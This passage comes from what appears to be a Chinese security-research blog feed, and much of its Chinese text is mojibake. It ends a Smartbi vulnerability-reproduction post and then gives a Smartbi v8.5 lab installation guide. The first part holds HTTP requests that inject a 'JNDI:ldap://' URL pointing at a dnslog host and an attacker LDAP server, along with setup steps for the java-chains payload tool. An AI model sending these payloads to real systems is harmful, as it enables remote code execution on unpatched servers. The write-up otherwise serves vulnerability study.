class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Origin</span>: http://localhost<br><span class="hljs-attribute">Referer</span>: http://localhost:<span class="hljs-number">18080</span>/smartbi/vision/index.jsp<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: JSESSIONID=<span class="hljs-number">3</span>D904649DC50813C9D6EDEBC582EE4CF<br><span class="hljs-attribute">Connection</span> : keep-alive<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">457</span><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://9sjhyp.dnslog.cn&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://192.168.1.25:15089/547b87&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p>ldap:&#x2F;&#x2F;192.168.1.25:15089&#x2F;b69569</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703187.png" alt="20250806193947601"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703694.png" alt="20250806194037543"></p><p>æ”¶åˆ°DNSLOGè®°å½•ï¼Œè¯´æ˜æ¼æ´å­˜åœ¨</p><h1 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h1><p>CVE-2020-1938 ï¼šApache Tomcat AJP æ¼æ´å¤ç°å’Œåˆ†æ</p><p><a href="https://www.cnblogs.com/backlion/p/12870365.html">https://www.cnblogs.com/backlion/p/12870365.html</a></p><p>Smartbi èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´</p><p><a href="https://www.freebuf.com/vuls/373015.html">https://www.freebuf.com/vuls/373015.html</a></p><p>ä¿¡æ¯æœé›†ç›¸å…³ï¼š</p><p><a href="https://ckcah.github.io/2020/05/01/googlehack/">https://ckcah.github.io/2020/05/01/googlehack/</a></p><p><a href="https://94248.github.io/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/">https://94248.github.io/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/</a></p><p>servlet</p><p><a href="https://86263008.github.io/web2024/back/java/jsp/servlet/index.html">https://86263008.github.io/web2024/back/java/jsp/servlet/index.html</a></p><p><a href="https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11">https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11</a></p><p><a href="https://blog.csdn.net/yxmoar/article/details/109889006">https://blog.csdn.net/yxmoar/article/details/109889006</a></p><p>JDBCååºåˆ—åŒ–å­¦ä¹ </p><p><a href="https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/news/7754">https://xz.aliyun.com/news/7754</a></p><p><a href="https://www.cnblogs.com/Litsasuk/articles/18410624">https://www.cnblogs.com/Litsasuk/articles/18410624</a></p><p><a href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html</a></p><h1 id="javachainsä½¿ç”¨"><a href="#javachainsä½¿ç”¨" class="headerlink" title="javachainsä½¿ç”¨"></a><strong>javachainsä½¿ç”¨</strong></h1><p><a href="https://java-chains.vulhub.org/zh/">https://java-chains.vulhub.org/zh/</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># docker æ­å»º</span><br><span class="hljs-attribute">docker</span> pull javachains/javachains:latest<br><br>docker run -d<span class="hljs-regexp"> ^</span><br>  --name java-chains<span class="hljs-regexp"> ^</span><br>  --restart=always<span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">8011</span>:<span class="hljs-number">8011</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">58080</span>:<span class="hljs-number">58080</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">15089</span>:<span class="hljs-number">50389</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">3308</span>:<span class="hljs-number">3308</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">13999</span>:<span class="hljs-number">13999</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">50000</span>:<span class="hljs-number">50000</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">11527</span>:<span class="hljs-number">11527</span><span class="hljs-regexp"> ^</span><br>  -e CHAINS_AUTH=<span class="hljs-literal">true</span><span class="hljs-regexp"> ^</span><br>  -e CHAINS_PASS=<span class="hljs-regexp"> ^</span><br>  javachains/javachains:latest<br><br><span class="hljs-comment">#æŸ¥çœ‹å½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span><br>docker ps<br><br><span class="hljs-comment">#æŸ¥æ‰¾æ—¥å¿—ä¸­åŒ…å«å…³é”®è¯ password çš„è¡Œ</span><br>docker logs java-chains | findstr password<br>&gt;<span class="hljs-number">08</span>-<span class="hljs-number">02</span> <span class="hljs-number">08</span>:<span class="hljs-number">06</span>:<span class="hljs-number">01</span>.<span class="hljs-number">144</span> INFO  [main] c.a.c.w.c.SecurityConfig       |  | password: HDVhxC2MfhKJwcAN<br><br><span class="hljs-comment">#åœæ­¢</span><br>docker stop java-chains<br><br><span class="hljs-comment">#åˆ é™¤</span><br>docker rm java-chains<br><br></code></pre></td></tr></table></figure><blockquote><p>Windows ç³»ç»Ÿ<strong>å°† 50389 ç«¯å£ä½œä¸ºæ’é™¤èŒƒå›´</strong>ï¼Œä¸å…è®¸ç¨‹åºï¼ˆåŒ…æ‹¬ Dockerï¼‰ç»‘å®šä½¿ç”¨å®ƒã€‚å¦‚æœæ”¹ç«¯å£å¯èƒ½æœ‰ä¸€äº›é—®é¢˜ï¼Œè¿˜æ˜¯å°½é‡åœ¨Linuxæ­å¯ä»¥é¿å…ç«¯å£é—®é¢˜ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703682.png" alt="20250806200152925"></p></blockquote><p>è®¿é—® <code>localhost:8011</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703554.png" alt="20250806200418498"></p><p>å¯†ç ï¼š<code>docker logs java-chains | findstr password</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071704470.png" alt="20250806200413737"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java ä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Smartbi v8.5 ç¯å¢ƒæ­å»º</title>
    <link href="/2025/08/07/Smartbi%20v8.5%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2025/08/07/Smartbi%20v8.5%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Smartbi-v8-5-ç¯å¢ƒæ­å»º"><a href="#Smartbi-v8-5-ç¯å¢ƒæ­å»º" class="headerlink" title="Smartbi v8.5 ç¯å¢ƒæ­å»º"></a>Smartbi v8.5 ç¯å¢ƒæ­å»º</h1><h2 id="ä¸€ã€å®‰è£…"><a href="#ä¸€ã€å®‰è£…" class="headerlink" title="ä¸€ã€å®‰è£…"></a>ä¸€ã€å®‰è£…</h2><p>é€šè¿‡ç½‘ç›˜åˆ†äº«çš„æ–‡ä»¶ï¼šSmartbi Insight Edition-2018-11-22.zip<br>é“¾æ¥: <a href="https://pan.baidu.com/s/15caJ59nCdUvNJcwwGx_VJQ">https://pan.baidu.com/s/15caJ59nCdUvNJcwwGx_VJQ</a> æå–ç : wan4 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207593.png" alt="20250730142614982"></p><p>ç”¨æˆ·åå’Œå…¬å¸åç§°éšæ„</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207797.png" alt="20250730142606223"></p><p>æ›´æ”¹å®‰è£…ç›®å½•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207535.png" alt="20250730142705002"></p><p><strong>æ­¤å¤„ï¼Œä¸è¦é€‰æ‹©â€œå®‰è£…æ¼”ç¤ºåº“â€ï¼Œå¦åˆ™ä¼šæŠ¥â€œæŠ¥è¡¨æ•°é‡è¶…è¿‡é™åˆ¶â€çš„é”™è¯¯</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207934.png" alt="20250730142800593"></p><p>ä¸é€‰æ‹©â€œæ³¨å†Œä¸ºWindowsæœåŠ¡â€ï¼Œå†…å­˜å¤§å°é»˜è®¤å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211381.png" alt="20250730142851342"></p><p>ç™»å½•é¦–é¡µçš„å¯†ç </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211551.png" alt="20250730142859437"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211744.png" alt="20250730142905276"></p><h2 id="äºŒã€licenseè·å–"><a href="#äºŒã€licenseè·å–" class="headerlink" title="äºŒã€licenseè·å–"></a>äºŒã€licenseè·å–</h2><p>å®˜ç½‘åœ°å€ï¼š<a href="https://www.smartbi.com.cn/">https://www.smartbi.com.cn/</a></p><p>licenseç”³è¯·åœ°å€ï¼š<a href="https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html">https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html</a></p><p>è¿™é‡Œç¬¬ä¸€æ¬¡è¿›å…¥éœ€è¦æ³¨å†Œ\ç™»å½•ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211274.png" alt="20250730201318600"></p><p>ä¹‹åä¾¿å¯ä»¥ç”³è¯·äº†ï¼Œé‚®ç®±è¦å¡«æ­£ç¡®ï¼Œä¹‹åä¼šå°† license å‘åˆ°é‚®ç®±é‡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072212883.png" alt="20250806200815728"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072213347.png" alt="image-20250807221345227"></p><p>é€‰æ‹©ä¸ªäººç‰ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072214816.png" alt="20250730201536174"></p><p>ä¹‹ååœ¨é‚®ç®±é‡Œå¯ä»¥çœ‹åˆ°å‘çš„ï¼šSmartbi-License.xml</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072214979.png" alt="20250730201709835"></p><h3 id="è·å–-licence-åï¼Œå°†å…¶æ”¾ç½®åœ¨-E-Smartbi-Tomcat-binæ–‡ä»¶å¤¹ä¸‹"><a href="#è·å–-licence-åï¼Œå°†å…¶æ”¾ç½®åœ¨-E-Smartbi-Tomcat-binæ–‡ä»¶å¤¹ä¸‹" class="headerlink" title="è·å– licence åï¼Œå°†å…¶æ”¾ç½®åœ¨ E:\Smartbi\Tomcat\binæ–‡ä»¶å¤¹ä¸‹"></a>è·å– licence åï¼Œå°†å…¶æ”¾ç½®åœ¨ <code>E:\Smartbi\Tomcat\bin</code>æ–‡ä»¶å¤¹ä¸‹</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072214848.png" alt="20250730203434407"></p><h2 id="ä¸‰ã€åˆ›å»ºæ•°æ®åº“"><a href="#ä¸‰ã€åˆ›å»ºæ•°æ®åº“" class="headerlink" title="ä¸‰ã€åˆ›å»ºæ•°æ®åº“"></a>ä¸‰ã€åˆ›å»ºæ•°æ®åº“</h2><p>é¦–å…ˆè¿æ¥ <code>Smartbi</code> ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215810.png" alt="20250730202151890"></p><p>åˆ›å»º<code>Smartbi</code> æ•°æ®åº“ï¼š</p><p><strong>ç¬¬ä¸€æ­¥è¿æ¥å¥½ä¹‹åï¼Œæ˜¯æ²¡æœ‰ smartbi æ•°æ®åº“çš„ï¼Œéœ€è¦è‡ªå·±åˆ›å»º</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215211.png" alt="20250730202209089"></p><p>ä¸‹é¢æ˜¯ MySQL çš„é…ç½®ï¼š</p><p><code>database-name</code> åœ¨é€‰æ‹©å®‰è£…â€œæ¼”ç¤ºæ•°æ®åº“â€æ—¶æ˜¯ï¼š<code>smartbidemo</code>ï¼›å’‹ä»¬æ²¡æœ‰é€‰æ‹©ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯ï¼š<code>smartbi</code>ã€‚</p><p>E:\Smartbi\Tomcat\bin\smartbi-config.xml</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215236.png" alt="20250730202402962"></p><h2 id="å››ã€è§£å†³æµè§ˆå™¨ç‰ˆæœ¬è¯¯åˆ¤"><a href="#å››ã€è§£å†³æµè§ˆå™¨ç‰ˆæœ¬è¯¯åˆ¤" class="headerlink" title="å››ã€è§£å†³æµè§ˆå™¨ç‰ˆæœ¬è¯¯åˆ¤"></a>å››ã€è§£å†³æµè§ˆå™¨ç‰ˆæœ¬è¯¯åˆ¤</h2><p>è¿™ä¸€æ­¥å¯ä»¥çœ‹ä¸‹é¢é—®é¢˜ä¸­çš„ <code>1ã€</code></p><h2 id="äº”ã€å¯åŠ¨ç¨‹åº"><a href="#äº”ã€å¯åŠ¨ç¨‹åº" class="headerlink" title="äº”ã€å¯åŠ¨ç¨‹åº"></a>äº”ã€å¯åŠ¨ç¨‹åº</h2><h3 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h3><p>E:\Smartbi\Tomcat\bin\startup.cmd</p><p>è¿è¡Œ startup.cmd ï¼Œå¯åŠ¨æœåŠ¡å™¨</p><h3 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3><p>ç³»ç»Ÿå¼€å§‹èœå•ä¸­æ‰¾åˆ° Smartbi çš„å®‰è£…ç›®å½•ï¼Œå•å‡»å¯åŠ¨SmartbiæœåŠ¡</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215033.png" alt="20250730203101194"></p><p>æ²¡æœ‰æŠ¥é”™çš„è¯ï¼Œå°±æ˜¯å¯åŠ¨æˆåŠŸäº†ï¼Œ</p><p><strong>è‹¥åˆ°è¿™ä¸€æ­¥æœåŠ¡å¯åŠ¨æœ‰é”™ï¼Œé‡å¯ç”µè„‘ï¼ï¼ï¼</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215464.png" alt="20250730203306884"></p><h2 id="å…­ã€é…ç½®ç¨‹åº"><a href="#å…­ã€é…ç½®ç¨‹åº" class="headerlink" title="å…­ã€é…ç½®ç¨‹åº"></a>å…­ã€é…ç½®ç¨‹åº</h2><p>è®¿é—®Smartbi:</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216056.png" alt="20250730203519660"></p><p>é¦–æ¬¡è®¿é—®ï¼Œéœ€è¾“å…¥å¯†ç ï¼Œè¿™é‡Œçš„å¯†ç éšæ„ï¼Œæˆ‘çš„æ˜¯ <code>admin</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216206.png" alt="20250730203618192"></p><p>æ¥ä¸‹æ¥çš„é…ç½®æŒ‰ç…§å›¾ä¸­æ‰€ç¤ºå³å¯ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216156.png" alt="20250730204159549"></p><h2 id="ä¸ƒã€è¿›å…¥ä¸»é¡µ"><a href="#ä¸ƒã€è¿›å…¥ä¸»é¡µ" class="headerlink" title="ä¸ƒã€è¿›å…¥ä¸»é¡µ"></a>ä¸ƒã€è¿›å…¥ä¸»é¡µ</h2><p>é‡å¯æœåŠ¡åï¼Œå†æ¬¡ç‚¹å‡»<code>è®¿é—®Smartbi</code>ï¼Œä¼šè¿›å…¥ä¸‹æ–¹é¡µé¢ï¼š</p><p><a href="http://localhost:18080/smartbi/vision/index.jsp">http://localhost:18080/smartbi/vision/index.jsp</a></p><p>é¦–æ¬¡è®¿é—®ç™»å½•é¡µï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216556.png" alt="20250730204745953"></p><p>æ­¤å¤„çš„æ—§å¯†ç æ˜¯<code>manager</code>ï¼Œä¹‹åè‡ªè¡Œä¿®æ”¹ä¸€ä¸ªæ–°å¯†ç ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217262.png" alt="20250730204612002"></p><p>è¿™æ˜¯ä¹‹åè®¿é—®ç™»å½•é¡µï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217160.png" alt="20250730204403222"></p><p>ç™»å½•ç³»ç»Ÿï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217230.png" alt="20250730204932051"></p><p>è‡³æ­¤ï¼ŒSmartbi v8.5 ç¯å¢ƒæ­å»ºå®Œæˆã€‚</p><h1 id="æ­å»ºæ—¶é‡åˆ°çš„é—®é¢˜ï¼ˆæŒ‰ç…§ä¸Šè¿°æ–¹æ³•å®‰è£…ååº”è¯¥ä¸ä¼šæœ‰ä¸‹åˆ—é—®é¢˜ï¼‰ï¼š"><a href="#æ­å»ºæ—¶é‡åˆ°çš„é—®é¢˜ï¼ˆæŒ‰ç…§ä¸Šè¿°æ–¹æ³•å®‰è£…ååº”è¯¥ä¸ä¼šæœ‰ä¸‹åˆ—é—®é¢˜ï¼‰ï¼š" class="headerlink" title="æ­å»ºæ—¶é‡åˆ°çš„é—®é¢˜ï¼ˆæŒ‰ç…§ä¸Šè¿°æ–¹æ³•å®‰è£…ååº”è¯¥ä¸ä¼šæœ‰ä¸‹åˆ—é—®é¢˜ï¼‰ï¼š"></a>æ­å»ºæ—¶é‡åˆ°çš„é—®é¢˜ï¼ˆæŒ‰ç…§ä¸Šè¿°æ–¹æ³•å®‰è£…ååº”è¯¥ä¸ä¼šæœ‰ä¸‹åˆ—é—®é¢˜ï¼‰ï¼š</h1><h2 id="1ã€æµè§ˆå™¨ç‰ˆæœ¬è¢«é”™è¯¯æ£€æµ‹"><a href="#1ã€æµè§ˆå™¨ç‰ˆæœ¬è¢«é”™è¯¯æ£€æµ‹" class="headerlink" title="1ã€æµè§ˆå™¨ç‰ˆæœ¬è¢«é”™è¯¯æ£€æµ‹"></a>1ã€æµè§ˆå™¨ç‰ˆæœ¬è¢«é”™è¯¯æ£€æµ‹</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217317.png" alt="20250730194311903"></p><p>å‚è€ƒï¼š<a href="https://www.xiaoheiwoo.com/windows-11-internet-explorer/">https://www.xiaoheiwoo.com/windows-11-internet-explorer/</a></p><h3 id="æ–¹æ³•ä¸€ï¼šä»â€œç®¡ç†åŠ è½½é¡¹â€çª—å£æ‰“å¼€-Internet-Explorer"><a href="#æ–¹æ³•ä¸€ï¼šä»â€œç®¡ç†åŠ è½½é¡¹â€çª—å£æ‰“å¼€-Internet-Explorer" class="headerlink" title="æ–¹æ³•ä¸€ï¼šä»â€œç®¡ç†åŠ è½½é¡¹â€çª—å£æ‰“å¼€ Internet Explorer"></a>æ–¹æ³•ä¸€ï¼šä»â€œç®¡ç†åŠ è½½é¡¹â€çª—å£æ‰“å¼€ Internet Explorer</h3><p>ç”¨è¿‡ IEæµè§ˆå™¨çš„äººåº”è¯¥çŸ¥é“ï¼ŒIEä¸­æ˜¯å¯ä»¥é€šè¿‡ Internetå±æ€§ çª—å£ï¼Œå¯¹æµè§ˆå™¨è¿›è¡ŒåŠŸèƒ½è®¾ç½®çš„ã€‚</p><p>è™½ç„¶ Win11é»˜è®¤æ‰¾ä¸åˆ° IEçš„å…¥å£ï¼Œä½†æ˜¯ Internetå±æ€§ ç¨‹åºä¾ç„¶å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥ç‚¹å‡»å…¶ä¸­çš„ ç®¡ç†åŠ è½½é¡¹ åŠŸèƒ½ï¼Œæ‰“å¼€ IE æµè§ˆå™¨ã€‚</p><p>æ­¥éª¤æ˜¯ï¼š</p><ol><li>é¦–å…ˆï¼ŒæŒ‰ <code>Win + R</code> æ‰“å¼€è¿è¡Œçª—å£</li><li>æ¥ä¸‹æ¥ï¼Œåœ¨è¿è¡Œå‘½ä»¤æ¡†ä¸­è¾“å…¥ <code>inetcpl.cpl</code></li><li>å•å‡» <code>ç¡®å®š</code> è¿›å…¥ Internet å±æ€§çª—å£</li><li>é€‰æ‹© <code>ç¨‹åº</code> é€‰é¡¹å¡ï¼Œç‚¹å‡» <code>ç®¡ç†åŠ è½½é¡¹</code> æŒ‰é’®<ol><li>ç„¶åï¼Œç‚¹å‡»çª—å£åº•éƒ¨ <code>äº†è§£æœ‰å…³å·¥å…·æ å’Œæ‰©å±•çš„è¯¦ç»†ä¿¡æ¯</code></li><li>é“›é“›é“›ï¼Œä½ è¦çš„ IEæµè§ˆå™¨å‡ºç°å•¦~</li></ol></li></ol><h3 id="æ–¹æ³•äºŒï¼šæ³¨é‡Šæ‰åˆ¤æ–­è¯­å¥"><a href="#æ–¹æ³•äºŒï¼šæ³¨é‡Šæ‰åˆ¤æ–­è¯­å¥" class="headerlink" title="æ–¹æ³•äºŒï¼šæ³¨é‡Šæ‰åˆ¤æ–­è¯­å¥"></a>æ–¹æ³•äºŒï¼šæ³¨é‡Šæ‰åˆ¤æ–­è¯­å¥</h3><p>è¿›å…¥ E:\Smartbi\Tomcat\webapps\smartbi\vision</p><p>æ‰¾åˆ°æ–‡ä»¶ config.jsp</p><p>å°†åˆ¤æ–­éƒ¨åˆ†æ³¨é‡Šæ‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072219561.png" alt="20250729143004181"></p><h2 id="2ã€æŠ¥è¡¨æ•°é‡è¶…è¿‡é™åˆ¶"><a href="#2ã€æŠ¥è¡¨æ•°é‡è¶…è¿‡é™åˆ¶" class="headerlink" 